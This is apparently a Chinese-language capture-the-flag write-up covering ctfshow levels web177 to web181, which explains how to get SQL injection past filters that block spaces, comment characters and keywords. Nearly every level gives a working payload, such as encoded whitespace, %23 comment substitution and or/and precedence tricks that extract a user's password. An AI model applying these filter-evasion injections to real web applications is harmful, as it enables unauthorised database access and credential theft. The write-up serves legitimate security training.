web177（过滤空格）

过滤了空格

因为+和#代表空格，所以也被过滤了

空格用/**/、%09、%0b、%0c、%a、%0d绕过

–+用%23绕过

1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23

web178(过滤空格、*)

空格用%09、%0b、%0c、%a、%0d绕过

-+用%23绕过

0'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username='flag'%23

web179(过滤空格、*、%0a%0b%09%0d )

空格用%0c绕过

-+可以用%23绕过

或

id=1'or'1'='1'%23

web180(过滤空格、*、%09%0b%0c%a%0d%23)

空格用%0c绕过

%23可以用--%0c绕过

也可以末尾直接闭合单引号

web181(过滤所有空格,%23,*,file,into,select且不区分大小写)

优先级

payload:

-1'or(id=26)and'1'='1

and的优先级比or要高，故注入后的语句变成了
select id,username,password frpm ctfshow_user where username !='flag' and id = '0'or(id=26)and'1'='1' limit 1;
前面满足条件id=0的记录不存在，故该语句可简化为
select id,username,password from ctfshow_user where (0) or(id=26)and'1'='1 limit 1;
先计算and，再计算or，最后得到满足id=26的记录

疑问：

为什么0'%0cor%0cusername%0clike%0c'flag也可以
